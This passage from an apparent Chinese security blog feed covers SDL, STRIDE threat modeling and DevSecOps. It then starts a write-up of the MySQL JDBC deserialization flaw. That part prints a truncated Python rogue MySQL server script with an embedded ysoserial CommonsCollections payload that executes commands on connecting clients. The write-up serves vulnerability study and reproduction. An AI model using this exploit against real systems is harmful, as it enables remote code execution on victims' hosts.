title="第三阶段：实施"></a>第三阶段：实施</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>使用批准的工具：所有开发团队都应定义并发布获准工具及其关联安全检查的列表，如编译器/链接器选项和警告。此列表应由项目团队的安全顾问进行批准。一般而言，开发团队应尽量使用最新版本的获准工具，以利用新的安全分析功能和保护措施。</li><li>弃用不安全的函数：许多常用函数和 API 在当前威胁环境下并不安全。项目团队应分析将与软件开发项目结合使用的所有函数和 API，并禁用确定为不安全的函数和 API。确定禁用列表之后，项目团队应使用头文件（如 banned.h 和 strsafe.h）、较新的编译器或代码扫描工具来检查代码（在适当情况下还包括旧代码）中是否存在禁用函数，并使用更安全的备选函数替代这些禁用函数。</li><li>静态代码分析：项目团队应对源代码执行静态分析。源代码静态分析为安全代码评析提供了伸缩性，可以帮助确保对安全代码策略的遵守。静态代码分析本身通常不足以替代人工代码评析。安全团队和安全顾问应了解静态分析工具的优点和缺点，并准备好根据需要为静态分析工具辅以其他工具或人工评析。</li></ul><h5 id="第四阶段：验证"><a href="#第四阶段：验证" class="headerlink" title="第四阶段：验证"></a>第四阶段：验证</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>动态程序分析：为确保程序功能按照设计方式工作，有必要对软件程序进行运行时验证。此验证任务应指定一些工具，用以监控应用程序行为是否存在内存损坏、用户权限问题以及其他重要安全问题。SDL 过程使用运行时工具（如 AppVerifier）以及其他方法（如模糊测试）来实现所需级别的安全测试覆盖率。</li><li>模糊测试：模糊测试是一种专门形式的动态分析，它通过故意向应用程序引入不良格式或随机数据诱发程序故障。模糊测试策略的制定以应用程序的预期用途以及应用程序的功能和设计规范为基础。安全顾问可能要求进行额外的模糊测试或扩大模糊测试的范围和增加持续时间。</li><li>威胁模型和攻击面评审：应用程序经常会严重偏离在软件开发项目要求和设计阶段所制定的功能和设计规范。因此，在给定应用程序完成编码后重新评析其威胁模型和攻击面度量是非常重要的。此评析可确保考虑到对系统设计或实现方面所做的全部更改，并确保因这些更改而形成的所有新攻击平台得以评析和缓解。</li></ul><h5 id="第五阶段：发布"><a href="#第五阶段：发布" class="headerlink" title="第五阶段：发布"></a>第五阶段：发布</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>事件响应计划：受SD 要求约束的每个软件发布都必须包含事件响应计划。即使在发布时不包含任何已知漏洞的程序也可能面临日后新出现的威胁。事件响应计划应包括：<ul><li>单独指定的可持续工程 (SE) 团队；或者，如果团队太小以至于无法拥有 SE 资源，则应制定紧急响应计划 (ERP)，在该计划中确定相应的工程、市场营销、通信和管理人员充当发生安全紧急事件时的首要联系点。</li><li>与决策机构的电话联系（7 x 24 随时可用）。</li><li>针对从组织中其他小组继承的代码的安全维护计划。</li><li>针对获得许可的第三方代码的安全维护计划，包括文件名、版本、源代码、第三方联系信息以及要更改的合同许可（如果适用）。</li></ul></li><li>最终安全评审：最终安全评析 (FSR) 是在发布之前仔细检查对软件应用程序执行的所有安全活动。FSR 由安全顾问在普通开发人员以及安全和隐私团队负责人的协助下执行。FSR 不是“渗透和修补”活动，也不是用于执行以前忽略或忘记的安全活动的时机。FSR 通常要根据以前确定的质量门或 Bug 栏检查威胁模型、异常请求、工具输出和性能。</li><li>发布/存档：指派负责发布事宜的安全顾问必须证明（使用 FSR 和其他数据）项目团队已满足安全要求。此外，必须对所有相关信息和数据进行存档，以便可以对软件进行发布后维护。这些信息和数据包括所有规范、源代码、二进制文件、专用符号、威胁模型、文档、紧急响应计划、任何第三方软件的许可证和服务条款以及执行发布后维护任务所需的任何其他数据。</li></ul><h5 id="发布后：响应"><a href="#发布后：响应" class="headerlink" title="发布后：响应"></a>发布后：响应</h5><p>产品在发布后的安全应急响应是必须要做的。</p><h4 id="可选的安全活动"><a href="#可选的安全活动" class="headerlink" title="可选的安全活动"></a>可选的安全活动</h4><p>可选的安全活动是需要专业的安全团队来完成的</p><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>尽管前面有静态代码分析的实践，但是都是基于使用静态代码扫描工具扫描的形式来进行的，其中可能会存在更多的安全代码问题比如业务逻辑漏洞、0day等是工具扫描不出来的，此时就需要专业的安全团队进行人工代码审计，从而进一步提高产品的安全性。</p><h5 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h5><p>渗透测试通过和代码审计一起完成的，侧重在模拟外部黑客来从外部进行黑/灰盒渗透测试，以黑客的视角来发现产品安全问题。</p><h5 id="相似产品的漏洞分析"><a href="#相似产品的漏洞分析" class="headerlink" title="相似产品的漏洞分析"></a>相似产品的漏洞分析</h5><p>专业安全团队通过分析友商或其他相似产品历史出现过的漏洞，再审计当前产品是否存在相似的漏洞，借助其他产品的经验来修补已知的安全问题。</p><h3 id="Threat-Modeling（威胁建模）"><a href="#Threat-Modeling（威胁建模）" class="headerlink" title="Threat Modeling（威胁建模）"></a>Threat Modeling（威胁建模）</h3><p>威胁建模是SDL流程中的核心组成部分，是一种可以用来帮助开发人员与SDL工程师提前识别可能影响到应用的威胁、攻击、漏洞和对策。使用威胁建模来完成产品的设计，可以有效满足企业的安全目标并降低安全风险。</p><p>微软中提到威胁建模的5个关键步骤如下：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/1.png" alt=""></p><ol><li>定义安全需求</li><li>创建应用图解</li><li>识别威胁</li><li>缓解威胁</li><li>验证威胁是否已缓解</li></ol><p>在进行威胁建模分析上，微软还提供了专用于威胁建模的工具Microsoft Threat Modeling Tool，工具下载地址：<a href="https://aka.ms/threatmodelingtool" target="_blank" rel="noopener">https://aka.ms/threatmodelingtool</a></p><p>威胁建模也是有方法的，就是STRIDE方法。</p><h3 id="STRIDE"><a href="#STRIDE" class="headerlink" title="STRIDE"></a>STRIDE</h3><p>STRIDE威胁建模是由微软提出的一种威胁建模方法，该方法将威胁类型分为Spoofing（仿冒）、Tampering（篡改）、Repudiation（抵赖）、Information Disclosure（信息泄漏）、Denial of Service（拒绝服务）和 Elevation of Privilege（权限提升）。STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题。</p><p>相关概念解释如下表：</p><table><thead><tr><th>威胁</th><th>定义</th><th>对应的安全属性</th></tr></thead><tbody><tr><td>Spoofing</td><td>冒充他人身份</td><td>认证</td></tr><tr><td>Tampering</td><td>修改数据或代码</td><td>完整性</td></tr><tr><td>Repudiation</td><td>否认做过的事</td><td>不可抵赖性</td></tr><tr><td>Information  Disclosure</td><td>机密信息泄露</td><td>机密性</td></tr><tr><td>Denial  of Service</td><td>拒绝服务</td><td>可用性</td></tr><tr><td>Elevation  of Privilege</td><td>未经授权获得许可</td><td>授权</td></tr></tbody></table><p>STRIDE威胁建模流程和前面介绍的一样：</p><ul><li>绘制数据流图</li><li>识别威胁</li><li>提出缓解措施</li><li>安全验证</li></ul><p><img src="/2021/05/16/浅谈SDL与DevSecOps/4.png" alt=""></p><h4 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h4><p>数据流图（Data Flow Diagrams）包含外部实体（External Entity）、处理过程（Process）、数据流（Data Flow）、数据存储（Data Store）：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/7.png" alt=""></p><p>安全人员与系统架构师及设计人员沟通，了解设计详情并画出数据流图后还需要标注信任边界（Trust Boundary），当然也可以通过赋能架构师与开发人员来自行画出数据流图让安全人员评审。</p><p>网上一个简单的Web应用数据流图如下，注意要用红色虚拟隔离出信任边界：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/5.png" alt=""></p><p>为了规范，是需要用到上面提到的Microsoft Threat Modeling Tool这个工具来描绘数据流图的，具体绘图细节这里不多说，看个网上的工具范例：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/6.png" alt=""></p><h4 id="识别威胁"><a href="#识别威胁" class="headerlink" title="识别威胁"></a>识别威胁</h4><p>STRIDE威胁建模方法已经明确了每个数据流图元素具有不同的威胁，其中外部实体只有仿冒（S）、抵赖（R）威胁，数据流只有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，处理过程有所有六种（STRIDE）威胁，存储过程有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，但如果是日志类型存储则还有抵赖（R）威胁。具体可以对照如下表格进行威胁识别：</p><table><thead><tr><th style="text-align:center"><strong>元素</strong></th><th style="text-align:center"><strong>S</strong></th><th style="text-align:center"><strong>T</strong></th><th style="text-align:center"><strong>R</strong></th><th style="text-align:center"><strong>I</strong></th><th style="text-align:center"><strong>D</strong></th><th style="text-align:center"><strong>E</strong></th></tr></thead><tbody><tr><td style="text-align:center">外部实体</td><td style="text-align:center">√</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">处理过程</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center">√</td></tr><tr><td style="text-align:center">数据存储</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center">？</td><td style="text-align:center">√</td><td style="text-align:center">√</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">数据流</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center"></td><td style="text-align:center">√</td><td style="text-align:center">√</td></tr></tbody></table><h4 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h4><p>识别到威胁之后，就要针对某一项危险提出对应的缓解措施。注意，这里之所以是缓解而不是消除，是因为大多数时候由于业务功能导致很多威胁是无法根除的。</p><p>微软对于常用的威胁给出了其常用的标准缓解措施，并在具体实施时已将常用的缓解方案及措施集成为独立的解决方案或者代码模块。可以方便同类应用直接使用。</p><table><thead><tr><th style="text-align:center"><strong>威胁类型</strong></th><th style="text-align:center"><strong>缓解措施</strong></th><th style="text-align:center"><strong>技术方案</strong></th></tr></thead><tbody><tr><td style="text-align:center">仿冒(S)</td><td style="text-align:center">认证</td><td style="text-align:center">Kerberos认证PKI系统如SSL / TLS证书数字签名</td></tr><tr><td style="text-align:center">篡改(T)</td><td style="text-align:center">完整性保护</td><td style="text-align:center">访问控制完整性校验</td></tr><tr><td style="text-align:center">抵赖(R)</td><td style="text-align:center">日志审计</td><td style="text-align:center">强认证安全日志、审计</td></tr><tr><td style="text-align:center">信息泄露(I)</td><td style="text-align:center">保密性</td><td style="text-align:center">加密访问控制列表</td></tr><tr><td style="text-align:center">拒绝服务(D)</td><td style="text-align:center">可用性</td><td style="text-align:center">访问控制列表过滤热备份</td></tr><tr><td style="text-align:center">权限提升(E)</td><td style="text-align:center">授权认证</td><td style="text-align:center">输入校验用户组管理访问控制列表</td></tr></tbody></table><h4 id="安全验证"><a href="#安全验证" class="headerlink" title="安全验证"></a>安全验证</h4><p>在威胁建模完成后，需要对整个过程进行回顾，不仅要确认缓解措施是否能够真正缓解潜在威胁，同时验证数据流图是否符合设计，代码实现是否符合预期设计，所有的威胁是否都有相应的缓解措施。最后将威胁建模报告留存档案，作为后续迭代开发、增量开发时威胁建模的参考依据。</p><h2 id="0x03-DevSecOps"><a href="#0x03-DevSecOps" class="headerlink" title="0x03 DevSecOps"></a>0x03 DevSecOps</h2><h3 id="软件开发模型的演进"><a href="#软件开发模型的演进" class="headerlink" title="软件开发模型的演进"></a>软件开发模型的演进</h3><p>在说到DevSecOps之前就必须先了解下软件开发模型的主要演进过程。</p><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h4><p>在传统的软件开发模型中，最常用的就是瀑布模型（Waterfall Model）。</p><p>瀑布模型是严格把软件项目的开发分隔成各个开发阶段，使用里程碑的方式，严格定义了各开发阶段的输入和输出。如果达不到要求的输出，下一阶段的工作就不展开。</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/8.png" alt=""></p><h4 id="敏捷开发"><a href="#敏捷开发" class="headerlink" title="敏捷开发"></a>敏捷开发</h4><p>传统的瀑布模型是没法满足日新月异的业务需求变化的，此时就出现了敏捷开发模型。</p><p>敏捷软件开发（Agile software development），又称敏捷开发，是一种从1990年代开始逐渐引起广泛关注的一些新型软件开发方法，是一种应对快速变化的需求的一种软件开发能力。它们的具体名称、理念、过程、术语都不尽相同，相对于“非敏捷”，更强调程序员团队与业务专家之间的紧密协作、面对面的沟通（认为比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好地适应需求变化的代码编写和团队组织方法，也更注重软件开发过程中人的作用。</p><p>敏捷开发的核心是迭代。</p><p>如图，可以明显看到两者的区别：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/9.png" alt=""></p><p>可以看到，敏捷开发是将分析、设计、编码和测试等阶段作为迭代的部分来进行迭代开发的。但是，这只是开发流程的快速优化，运维流程并不在其中，也就是说在瀑布或敏捷模型中都是要开发流程走完才能到达运维人员负责后续的运维阶段（Operations）的工作，这就导致业务不能提供更快速稳定的交付了。此时，DevOps应运而生。</p><h4 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h4><h5 id="DevOps简介"><a href="#DevOps简介" class="headerlink" title="DevOps简介"></a>DevOps简介</h5><p>DevOps并无权威官方的描述定义，这里引用维基百科的：</p><blockquote><p><strong>DevOps</strong>（<strong>Dev</strong>elopment和<strong>Op</strong>erations的组合词）是一种重视“软件开发人员（Dev）”和“IT运维技术人员（Ops）”之间沟通合作的文化、运动或惯例。透过自动化“软件交付”和“架构变更”的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。</p></blockquote><p>可以把DevOps看作开发（软件工程）、技术运营和质量保障（QA）三者的交集：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/2.png" alt=""></p><p>DevOps强调的是高效组织团队之间如何通过自动化的工具协作和沟通来完成软件的生命周期管理，从而更快、更频繁地交付更稳定的软件。</p><h5 id="DevOps生命周期"><a href="#DevOps生命周期" class="headerlink" title="DevOps生命周期"></a>DevOps生命周期</h5><p>DevOps的生命周期如图，是个循环的、开发与运维各阶段活动集成的：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/10.png" alt=""></p><h5 id="概念对比"><a href="#概念对比" class="headerlink" title="概念对比"></a>概念对比</h5><p>这里引用腾讯安全云鼎实验室的图，一目了然这几种软件开发模型之间的区别：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/11.png" alt=""></p><p>如上图所示，部署操作并不是等到最后才进行、而是和开发测试操作一同迭代进行的。</p><h5 id="DevOps做法"><a href="#DevOps做法" class="headerlink" title="DevOps做法"></a>DevOps做法</h5><p>DevOps做法如下：</p><ul><li>持续集成和持续交付（CI/CD）</li><li>版本控制</li><li>敏捷软件开发</li><li>基础结构即代码</li><li>配置管理</li><li>持续监视</li></ul><h5 id="给SDL带来的挑战"><a href="#给SDL带来的挑战" class="headerlink" title="给SDL带来的挑战"></a>给SDL带来的挑战</h5><p>SDL是将安全考虑集成在软件开发的每一个阶段、为每一个开发阶段添加对应的安全活动，是基于产品发布上线前进行的一系列安全活动，这种模式在瀑布模型和敏捷开发中是适用的。但是到了DevOps后，SDL就显得相形见绌了，主要在于DevOps的快速持续集成、持续交付、持续部署等特性和SDL执行的流水线式缓慢过程是互相冲突的，这就使得安全拖慢了DevOps。</p><p>基于此，Gartner在2012年就提出了DevSecOps来解决安全DevOps问题。</p><h3 id="DevSecOps简介"><a href="#DevSecOps简介" class="headerlink" title="DevSecOps简介"></a>DevSecOps简介</h3><p>DevSecOps，全称Development Security Operations，是一套有Gartner提出的基于DevOps体系的全新IT安全实践战略框架，是一种旨在将安全性嵌入DevOps链条中的每个部分新方法，它有助于在开发过程早期而不是产品发布后识别安全问题，目标是让每个人对信息安全负责，而不仅仅是安全部门。</p><p>相比于SDL，DevSecOps已不只是关注开发阶段的安全，而是需要将安全嵌入到开发和运维的整个DevOps的生命周期中。</p><p>在之前，安全只是特定团队的职责，是在开发的最后阶段才会介入的：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/13.png" alt=""></p><p>这种方式显然会拖累DecOps的高效性，因此DevSecOps提出的概念就是，安全是整个IT团队的共同职责，人人为安全负责，人人参与安全：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/14.png" alt=""></p><p>广义上的DevOps的建设会包含：人、流程、工具等多方面内容。</p><p>因此，DevSecOps 意味着从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择合适的工具来持续集成安全防护（比如在集成开发环境（IDE）中集成安全防护功能）有助于实现这些目标。但是高效的 DevOps 安防需要的不仅是新工具。它更需要整个公司实现 DevOps 文化变革，从而尽早集成安全团队的工作。</p><h3 id="DevSecOps架构图"><a href="#DevSecOps架构图" class="headerlink" title="DevSecOps架构图"></a>DevSecOps架构图</h3><p>DevSecOps架构图如下：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/12.png" alt=""></p><h3 id="从SDL到DevSecOps的变化"><a href="#从SDL到DevSecOps的变化" class="headerlink" title="从SDL到DevSecOps的变化"></a>从SDL到DevSecOps的变化</h3><p>个人理解，DevSecOps就是SDL针对DecOps的快速优化版，两者并非是完全不同的东西，而是针对迭代快速的业务进行的优化：</p><ul><li>安全文化普及，强调每个人都对安全负责；</li><li>更多的自动化实现，摒弃SDL中过多的人工参与；</li><li>融入整个开发与运维流程中，而不是只嵌入开发流程；</li><li>使得安全活动更为前置；</li></ul><h3 id="DevSecOps实践"><a href="#DevSecOps实践" class="headerlink" title="DevSecOps实践"></a>DevSecOps实践</h3><p>这块尚未接触，写了也是纸上谈兵，后续如果接触到DevSecOps实践这块再补充。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.fooying.com/from_sdl_to_devsecops_security_in_dev/" target="_blank" rel="noopener">从SDL到DevSecOps：始终贯穿开发生命周期的安全</a></p><p><a href="https://www.microsoft.com/en-us/securityengineering/sdl/" target="_blank" rel="noopener">Microsoft Security Development Lifecycle</a></p><p><a href="http://blog.nsfocus.net/sdl/" target="_blank" rel="noopener">【软件安全设计】安全开发生命周期（SDL）</a></p><p><a href="https://azure.microsoft.com/zh-cn/overview/what-is-devops/" target="_blank" rel="noopener">什么是 DevOps？</a></p><p><a href="https://www.redhat.com/zh/topics/devops/what-is-devsecops" target="_blank" rel="noopener">什么是 DevSecOps?</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="SDL&amp;DevSecOps" scheme="https://www.mi1k7ea.com/categories/SDL-DevSecOps/"/>
    
    
      <category term="DevSecOps" scheme="https://www.mi1k7ea.com/tags/DevSecOps/"/>
    
      <category term="SDL" scheme="https://www.mi1k7ea.com/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL JDBC反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC反序列化漏洞/</id>
    <published>2021-04-23T04:33:08.000Z</published>
    <updated>2021-04-25T14:41:30.974Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>HW期间遇到这个洞，研究研究。</p><p>参考：</p><ul><li><a href="https://xz.aliyun.com/t/8159" target="_blank" rel="noopener">小白看得懂的MySQL JDBC 反序列化漏洞分析</a></li><li><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">MySQL JDBC 客户端反序列化漏洞分析</a></li><li><a href="https://paper.seebug.org/1227/" target="_blank" rel="noopener">MySQL JDBC 客户端反序列化漏洞</a></li></ul><h2 id="0x01-MySQL-JDBC反序列化漏洞"><a href="#0x01-MySQL-JDBC反序列化漏洞" class="headerlink" title="0x01 MySQL JDBC反序列化漏洞"></a>0x01 MySQL JDBC反序列化漏洞</h2><h3 id="JDBC简介"><a href="#JDBC简介" class="headerlink" title="JDBC简介"></a>JDBC简介</h3><p>JDBC（Java DataBase Connectivity）即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。</p><p>一般格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc://driver://host:port/database?配置name1=配置Value1&amp;配置name2=配置Value2</span><br></pre></td></tr></table></figure><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果攻击者能够控制JDBC连接设置项，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。</p><p>具体点说，就是通过JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作。如果攻击者搭建恶意MySQL服务器来控制这两个查询的结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC客户端反序列化漏洞。</p><p>可被利用的两条查询语句：</p><ul><li>SHOW SESSION STATUS</li><li>SHOW COLLATION</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>恶意MySQL服务器搭建可参考：</p><ul><li><a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></li><li><a href="https://github.com/rmb122/rogue_mysql_server" target="_blank" rel="noopener">https://github.com/rmb122/rogue_mysql_server</a></li></ul><p>这里采用的是另一个脚本，使用Python3运行即可，只用Python自带的库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"</span></span><br><span class="line">response_ok_data=<span class="string">"0700000200000002000000"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_data</span><span class="params">(conn)</span>:</span></span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"[*] Receiveing the package : &#123;&#125;"</span>.format(data))</span><br><span class="line">    <span class="keyword">return</span> str(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(conn,data)</span>:</span></span><br><span class="line">    print(<span class="string">"[*] Sending the package : &#123;&#125;"</span>.format(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload_content</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r'payload'</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = str(binascii.b2a_hex(f.read()),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        print(<span class="string">"open successs"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"open false"</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        print(<span class="string">"Connection come from &#123;&#125;:&#123;&#125;"</span>.format(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"session.auto_increment_increment"</span> <span class="keyword">in</span> data:</span><br><span class="line">                